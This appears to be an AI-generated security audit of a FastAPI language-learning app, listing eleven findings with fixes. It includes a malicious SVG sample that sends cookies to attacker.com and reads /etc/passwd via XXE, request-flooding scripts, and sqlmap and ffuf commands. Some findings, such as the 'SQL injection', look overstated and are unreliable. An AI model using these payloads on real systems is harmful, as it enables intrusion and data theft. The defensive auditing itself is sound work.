# Security Vulnerability Review
**Application:** Spaans Leren App
**Review Date:** November 15, 2025
**Reviewer:** Claude Code Security Review
**Status:** ⚠️ MULTIPLE CRITICAL VULNERABILITIES FOUND

---

## Executive Summary

This security review identified **11 security vulnerabilities** across varying severity levels:
- 🔴 **CRITICAL**: 3 findings
- 🟠 **HIGH**: 4 findings
- 🟡 **MEDIUM**: 3 findings
- 🟢 **LOW**: 1 finding

**Overall Risk Level:** 🔴 **HIGH**

The application is currently suitable for **personal use only** but requires significant hardening before any multi-user deployment or exposure to the internet.

---

## Critical Vulnerabilities (🔴 Immediate Action Required)

### 1. 🔴 CRITICAL: No Authentication/Authorization

**Location:** All API endpoints (`backend/main.py`)
**Severity:** CRITICAL
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Description:**
The application has **zero authentication or authorization** on any endpoints. Any user who can reach the API can:
- View all words in the database (`GET /api/words/`)
- Add unlimited words (`POST /api/words/`)
- Delete any word (`DELETE /api/words/{word_id}`)
- Trigger expensive AI operations
- Access all user statistics and learning data

**Affected Endpoints:**
```python
# Examples of unprotected endpoints:
@app.post("/api/words/", response_model=WordResponse)  # Line 867
@app.delete("/api/words/{word_id}")  # Line 1008
@app.post("/api/words/regenerate-all", ...)  # Line 1126
```

**Impact:**
- Complete data breach possible
- Unauthorized data modification/deletion
- API abuse and cost escalation (AI API calls)
- Privacy violation (learning progress exposed)

**Recommendation:**
```python
# Implement OAuth2 or API key authentication
from fastapi.security import OAuth2PasswordBearer, HTTPBearer

security = HTTPBearer()

@app.post("/api/words/", response_model=WordResponse)
async def create_word(
    word_data: WordCreate,
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_db)
):
    # Verify token/API key
    verify_token(credentials.credentials)
    # ... rest of endpoint
```

**Alternative for Personal Use:**
If staying single-user, implement network-level restrictions (firewall, VPN, localhost-only binding).

---

### 2. 🔴 CRITICAL: Wide-Open CORS Policy

**Location:** `backend/main.py:25-31`
**Severity:** CRITICAL
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)

**Vulnerable Code:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ❌ Allows ANY origin!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Impact:**
- Any website can make requests to your API
- Cross-Site Request Forgery (CSRF) attacks possible
- Session hijacking if cookies are used
- Data exfiltration from malicious sites

**Recommendation:**
```python
# Whitelist only your frontend origin(s)
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost",
        "https://spaans.local",
        "https://spaans.orb.local"
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "DELETE"],  # Restrict methods
    allow_headers=["Content-Type", "Authorization"],  # Restrict headers
)
```

---

### 3. 🔴 CRITICAL: SQL Injection Vulnerability

**Location:** `backend/main.py:969-972`
**Severity:** CRITICAL
**CWE:** CWE-89 (SQL Injection)

**Vulnerable Code:**
```python
if search:
    search_term = f"%{search}%"  # ❌ String interpolation!
    query = query.filter(
        (Word.dutch_word.like(search_term)) |
        (Word.spanish_word.like(search_term))
    )
```

**Impact:**
While SQLAlchemy provides **some** protection, the `.like()` operator with user-controlled wildcards can still be exploited for:
- Information disclosure (timing attacks)
- Denial of Service (expensive queries with `%%%%%`)
- Potential SQL injection if backend switches databases

**Attack Example:**
```bash
# DoS attack with excessive wildcards
GET /api/words/?search=%%%%%%%%%%%%%%%%%%
```

**Recommendation:**
```python
# Sanitize search input
import re

if search:
    # Remove special characters, limit length
    sanitized = re.sub(r'[%_\\]', '', search)[:50]
    search_term = f"%{sanitized}%"
    query = query.filter(
        (Word.dutch_word.like(search_term)) |
        (Word.spanish_word.like(search_term))
    )
```

---

## High Severity Vulnerabilities (🟠)

### 4. 🟠 HIGH: No Rate Limiting

**Location:** All endpoints
**Severity:** HIGH
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:**
No rate limiting exists on any endpoint, including expensive AI operations.

**Impact:**
- API cost explosion via `/api/words/` spam (Claude API costs ~$0.0045/call)
- Denial of Service through resource exhaustion
- Database flooding with unlimited word creation

**Attack Scenario:**
```python
# Attacker script - costs you $45 in 10 seconds
for i in range(10000):
    requests.post("http://spaans.local/api/words/",
                  json={"dutch_word": f"test{i}"})
```

**Recommendation:**
```python
# Add slowapi for rate limiting
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/api/words/")
@limiter.limit("10/minute")  # Max 10 words per minute
async def create_word(...):
    ...
```

---

### 5. 🟠 HIGH: Unvalidated AI Output Execution

**Location:** `backend/main.py:618-645`
**Severity:** HIGH
**CWE:** CWE-94 (Improper Control of Generation of Code)

**Vulnerable Code:**
```python
svg_code = message.content[0].text.strip()  # ❌ Unvalidated AI output

# Minimal validation only
if "<svg" not in svg_lower:
    return False, "Missing <svg> opening tag"
```

**Impact:**
- AI-generated SVG could contain malicious JavaScript
- XSS attacks via `<script>` tags in SVG
- XML External Entity (XXE) attacks
- Data exfiltration via external resource loading

**Malicious SVG Example:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
  <!-- Or XXE attack: -->
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text>&xxe;</text>
</svg>
```

**Recommendation:**
```python
import re
from xml.etree import ElementTree

def validate_svg(svg_code: str) -> tuple[bool, str]:
    """Strict SVG validation"""

    # 1. Check for script tags
    if re.search(r'<script', svg_code, re.IGNORECASE):
        return False, "Scripts not allowed in SVG"

    # 2. Check for external resources
    if re.search(r'xlink:href\s*=\s*["\']https?://', svg_code):
        return False, "External resources not allowed"

    # 3. Check for DOCTYPE/entities (XXE protection)
    if '<!DOCTYPE' in svg_code or '<!ENTITY' in svg_code:
        return False, "DOCTYPE/entities not allowed"

    # 4. Parse as XML to ensure well-formed
    try:
        ElementTree.fromstring(svg_code)
    except ElementTree.ParseError as e:
        return False, f"Invalid XML: {e}"

    # 5. Whitelist allowed tags
    allowed_tags = {'svg', 'rect', 'circle', 'ellipse', 'line',
                   'polyline', 'polygon', 'path', 'text', 'g',
                   'defs', 'linearGradient', 'stop', 'filter'}

    tree = ElementTree.fromstring(svg_code)
    for elem in tree.iter():
        tag = elem.tag.split('}')[-1]  # Remove namespace
        if tag not in allowed_tags:
            return False, f"Disallowed tag: {tag}"

    return True, "Valid"
```

---

### 6. 🟠 HIGH: Missing Input Validation

**Location:** Multiple endpoints
**Severity:** HIGH
**CWE:** CWE-20 (Improper Input Validation)

**Examples:**
```python
# backend/main.py:867 - No length limit on dutch_word
class WordCreate(BaseModel):
    dutch_word: str  # ❌ Could be 10MB of text!

# backend/main.py:1258 - Quality validation exists but other inputs unchecked
if review.quality not in [0, 3, 4, 5]:  # ✅ Good
    raise HTTPException(...)
```

**Impact:**
- Database bloat (unlimited text storage)
- Memory exhaustion attacks
- Display issues (extremely long strings)

**Recommendation:**
```python
from pydantic import BaseModel, Field, validator

class WordCreate(BaseModel):
    dutch_word: str = Field(..., min_length=1, max_length=100)

    @validator('dutch_word')
    def validate_dutch_word(cls, v):
        # Only allow letters, spaces, hyphens
        if not re.match(r'^[a-zA-ZÀ-ÿ\s\-]+$', v):
            raise ValueError('Invalid characters in word')
        return v.strip()
```

---

### 7. 🟠 HIGH: API Key Exposure Risk

**Location:** `backend/.env` (mounted in Docker)
**Severity:** HIGH
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Current Setup:**
```yaml
# docker-compose.yml:30
volumes:
  - ./backend:/app  # ❌ Mounts entire backend including .env!
```

**Risks:**
- `.env` file accessible from container
- Logs may contain API key if errors occur
- Source code contains API key in bind mount
- No `.env.example` file for safe reference

**Evidence of Logging Risk:**
```python
# backend/main.py:334-336
api_key = os.getenv("ANTHROPIC_API_KEY")
if not api_key:
    raise HTTPException(status_code=500,
        detail="ANTHROPIC_API_KEY niet gevonden...")  # Could log this!
```

**Recommendation:**
1. **Add `.env.example`:**
```bash
# backend/.env.example
ANTHROPIC_API_KEY=sk-ant-your-key-here-replace-me
OLLAMA_HOST=ollama:11434
```

2. **Use Docker secrets (production):**
```yaml
# docker-compose.yml
secrets:
  anthropic_key:
    file: ./secrets/anthropic_api_key.txt

services:
  backend:
    secrets:
      - anthropic_key
```

3. **Filter logs:**
```python
import logging

class SensitiveDataFilter(logging.Filter):
    def filter(self, record):
        # Redact API keys from logs
        record.msg = re.sub(r'sk-ant-[a-zA-Z0-9\-]+', 'sk-ant-***',
                           str(record.msg))
        return True

logging.getLogger().addFilter(SensitiveDataFilter())
```

---

## Medium Severity Vulnerabilities (🟡)

### 8. 🟡 MEDIUM: No HTTPS/TLS Encryption

**Location:** `nginx/nginx.conf:14` + `docker-compose.yml:48-49`
**Severity:** MEDIUM
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Current Configuration:**
```nginx
# nginx.conf
server {
    listen 80;  # ❌ No HTTPS!
    ...
}
```

**Impact:**
- Credentials transmitted in plaintext (if auth added)
- Session hijacking via network sniffing
- Man-in-the-Middle attacks
- API key interception (if sent from frontend)

**Recommendation:**
```nginx
# nginx.conf with TLS
server {
    listen 443 ssl http2;
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    # Modern TLS configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000" always;
    ...
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

**For Local Development:**
```bash
# Generate self-signed cert
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout nginx/ssl/key.pem -out nginx/ssl/cert.pem
```

---

### 9. 🟡 MEDIUM: Missing Security Headers

**Location:** `nginx/nginx.conf`
**Severity:** MEDIUM
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Missing Headers:**
- `X-Frame-Options` (Clickjacking protection)
- `X-Content-Type-Options` (MIME sniffing prevention)
- `Content-Security-Policy` (XSS mitigation)
- `Referrer-Policy` (Privacy)

**Recommendation:**
```nginx
# nginx.conf - Add to server block
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Content Security Policy (adjust as needed)
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval'
               https://unpkg.com https://cdn.tailwindcss.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data: https:;
    connect-src 'self';
" always;
```

---

### 10. 🟡 MEDIUM: Insecure Docker Configuration

**Location:** `backend/Dockerfile:21` + `docker-compose.yml`
**Severity:** MEDIUM
**CWE:** CWE-1188 (Insecure Default Initialization of Resource)

**Issues:**
1. **Running with --reload in production** (Dockerfile:21)
2. **No resource limits** (docker-compose.yml)
3. **Running as root user** (no USER directive)

**Vulnerable Configuration:**
```dockerfile
# Dockerfile
CMD ["uvicorn", "main:app", "--host", "0.0.0.0",
     "--port", "8002", "--reload"]  # ❌ Reload in prod!
```

**Recommendations:**

**1. Separate dev/prod Dockerfiles:**
```dockerfile
# Dockerfile.prod
FROM python:3.11-slim

WORKDIR /app

# Create non-root user
RUN useradd -m -u 1000 appuser && \
    mkdir -p /app/data && \
    chown -R appuser:appuser /app

COPY --chown=appuser:appuser requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY --chown=appuser:appuser . .

USER appuser

# No --reload flag
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8002"]
```

**2. Add resource limits:**
```yaml
# docker-compose.yml
services:
  backend:
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 512M
```

---

## Low Severity Findings (🟢)

### 11. 🟢 LOW: Verbose Error Messages

**Location:** Multiple exception handlers
**Severity:** LOW
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Examples:**
```python
# backend/main.py:886
except Exception as e:
    error_detail = f"AI generatie fout: {str(e)}\n{traceback.format_exc()}"
    print(error_detail)  # ❌ Full stack trace in logs
    raise HTTPException(status_code=500, detail=f"AI generatie fout: {str(e)}")
```

**Impact:**
- Information disclosure (file paths, internal structure)
- Debugging info exposed to users
- Potential security issue discovery by attackers

**Recommendation:**
```python
# Log detailed errors, return generic messages
import logging

logger = logging.getLogger(__name__)

try:
    # ... code ...
except Exception as e:
    logger.exception("AI generation failed")  # Detailed log
    raise HTTPException(
        status_code=500,
        detail="Er is een fout opgetreden bij het genereren"  # Generic message
    )
```

---

## Additional Security Recommendations

### 1. Database Security
```python
# database.py - Add backup encryption
import sqlite3

# Enable SQLite encryption (requires SQLCipher)
SQLALCHEMY_DATABASE_URL = "sqlite+pysqlcipher:///:memory:?cipher=aes-256-cfb&kdf_iter=64000"
```

### 2. Dependency Security
```bash
# Run security audit regularly
pip install safety
safety check -r requirements.txt

# Or use pip-audit
pip install pip-audit
pip-audit
```

### 3. Container Scanning
```bash
# Scan Docker images for vulnerabilities
docker scan spaans-leren-backend:latest
```

### 4. API Request Validation
```python
# Add request size limits
from fastapi import Request
from starlette.middleware.base import BaseHTTPMiddleware

class RequestSizeLimiter(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if request.headers.get("content-length"):
            if int(request.headers["content-length"]) > 1_000_000:  # 1MB
                return JSONResponse(
                    {"detail": "Request too large"},
                    status_code=413
                )
        return await call_next(request)

app.add_middleware(RequestSizeLimiter)
```

---

## Compliance & Privacy Concerns

### GDPR Considerations (if deploying in EU)
- No privacy policy
- No consent mechanism for data collection
- No data deletion mechanism (right to be forgotten)
- Learning data stored indefinitely

### Recommendations:
1. Add `/api/users/me/data` endpoint for data export
2. Add `/api/users/me/delete` for account deletion
3. Implement data retention policies
4. Add cookie consent banner if tracking added

---

## Testing Recommendations

### Security Testing Checklist
```bash
# 1. SQL Injection testing
sqlmap -u "http://spaans.local/api/words/?search=test" --batch

# 2. API fuzzing
ffuf -u http://spaans.local/api/FUZZ -w wordlist.txt

# 3. CORS testing
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS http://spaans.local/api/words/

# 4. Rate limit testing
for i in {1..1000}; do
  curl -X POST http://spaans.local/api/words/ \
       -H "Content-Type: application/json" \
       -d '{"dutch_word":"test"}' &
done
```

---

## Remediation Priority

### Immediate (Before Any Public Use)
1. ✅ Add authentication/authorization (#1)
2. ✅ Fix CORS policy (#2)
3. ✅ Implement rate limiting (#4)

### High Priority (Within 1 Week)
4. ✅ Validate AI-generated SVG content (#5)
5. ✅ Add input validation (#6)
6. ✅ Secure .env file handling (#7)

### Medium Priority (Within 1 Month)
7. ✅ Implement HTTPS/TLS (#8)
8. ✅ Add security headers (#9)
9. ✅ Harden Docker config (#10)

### Low Priority (Ongoing)
10. ✅ Sanitize error messages (#11)
11. ✅ Regular dependency audits
12. ✅ Container security scanning

---

## Conclusion

The application demonstrates good coding practices (SQLAlchemy ORM, Pydantic validation, Docker containerization) but **lacks critical security controls** for any deployment beyond personal, localhost-only use.

**Current State:**
✅ Safe for: Single-user, localhost, development
❌ Unsafe for: Multi-user, internet-facing, production

**After Remediation:**
With the recommended fixes implemented, the application would be suitable for:
- Small team deployments (with authentication)
- Internal network use
- Cautious public deployment (with ongoing monitoring)

**Estimated Remediation Time:**
- Critical + High issues: ~16-24 hours of development
- Medium issues: ~8-12 hours
- Total: ~2-3 days of focused security work

---

**Report Generated:** 2025-11-15
**Next Review Recommended:** After remediation or before production deployment
